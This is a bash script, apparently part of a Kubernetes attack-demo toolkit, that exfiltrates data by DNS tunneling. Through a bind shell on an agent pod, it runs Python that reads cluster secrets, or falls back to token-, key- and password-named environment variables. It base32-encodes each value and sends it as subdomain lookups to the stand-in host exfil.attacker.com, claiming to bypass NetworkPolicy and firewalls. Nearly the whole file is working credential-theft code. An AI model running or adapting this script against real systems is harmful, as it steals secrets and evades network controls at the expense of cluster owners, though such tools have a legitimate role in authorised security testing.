#!/usr/bin/env bash
# DNS tunneling: exfiltrate data by encoding it as DNS subdomain queries.
# Bypasses NetworkPolicy and most firewalls since DNS is rarely blocked.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-exfil-dns.sh [--data STRING]"
  echo "  Exfiltrates data via DNS tunneling by encoding it as subdomain queries."
  echo "  If --data is not specified, automatically reads and exfiltrates k8s secrets."
  echo ""
  echo "  The DNS server at the exfil domain captures the data from query logs."
  echo "  Bypasses NetworkPolicy since DNS queries go through cluster DNS."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS       agent namespace (default: agent-namespace)"
  echo "  BIND_PORT      bind shell port (default: 4444)"
  echo "  EXFIL_DOMAIN   exfiltration domain (default: exfil.attacker.com)"
  exit 0
fi

EXFIL_DATA=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --data) EXFIL_DATA="$2"; shift 2 ;;
    *) shift ;;
  esac
done

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

EXFIL_DOMAIN="${EXFIL_DOMAIN:-exfil.attacker.com}"

banner "Post-Breach: DNS Tunneling Exfiltration"
echo "@PHASE DNS-Exfiltration"

PYTHON_CODE="${K8S_API_PREAMBLE}

exfil_domain = '${EXFIL_DOMAIN}'
manual_data = '''${EXFIL_DATA}'''

print('@PHASE Prepare-Exfil')
print('=' * 60)
print('  DNS TUNNELING: Data Exfiltration')
print('=' * 60)
print(f'  Exfil domain: {exfil_domain}')
print()

def dns_exfil(data, label='data'):
    \"\"\"Encode data as DNS subdomain queries. Each query carries up to 50 bytes.\"\"\"
    import base64
    encoded = base64.b32encode(data.encode()).decode().lower().rstrip('=')
    # DNS labels max 63 chars, split into chunks
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
    print(f'  Exfiltrating {label}: {len(data)} bytes in {len(chunks)} DNS queries')
    print(f'@FINDING high Exfiltrating {label}: {len(data)} bytes via {len(chunks)} DNS queries')
    print(f'@LOOT exfil-proof dns:{label}:{len(data)}-bytes')
    for i, chunk in enumerate(chunks):
        subdomain = f'{chunk}.{i}.{label}.{exfil_domain}'
        try:
            socket.getaddrinfo(subdomain, None)
        except socket.gaierror:
            pass  # Expected — the domain doesn't resolve, but the query was logged
        print(f'    [{i+1}/{len(chunks)}] {subdomain[:60]}...')

print('@PHASE Execute-Exfil')
if manual_data:
    dns_exfil(manual_data, 'manual')
else:
    # Auto-mode: read secrets and exfiltrate them
    print('  Auto mode: reading secrets from target-apps...')
    secrets = k8s_get('/api/v1/namespaces/target-apps/secrets')
    if 'error' not in secrets:
        for s in secrets.get('items', []):
            name = s['metadata']['name']
            for k, v in s.get('data', {}).items():
                try:
                    decoded = base64.b64decode(v).decode()
                    dns_exfil(f'{k}={decoded}', f'secret-{name}')
                except Exception:
                    pass
    else:
        print(f'  Could not read secrets: {secrets}')
        # Fallback: exfil environment variables
        print('  Falling back to environment variables...')
        sensitive = {k: v for k, v in os.environ.items()
                    if any(s in k.upper() for s in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'API'])}
        for k, v in sensitive.items():
            dns_exfil(f'{k}={v}', f'env-{k.lower()}')

print()
print('@RESULT success DNS tunneling exfiltration complete')
print('DNS tunneling exfiltration complete.')
print('Data encoded as DNS queries — captured by attacker DNS server.')
"

echo "  Exfil domain: $EXFIL_DOMAIN"
echo "  Piping DNS exfiltration script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "DNS tunneling complete."
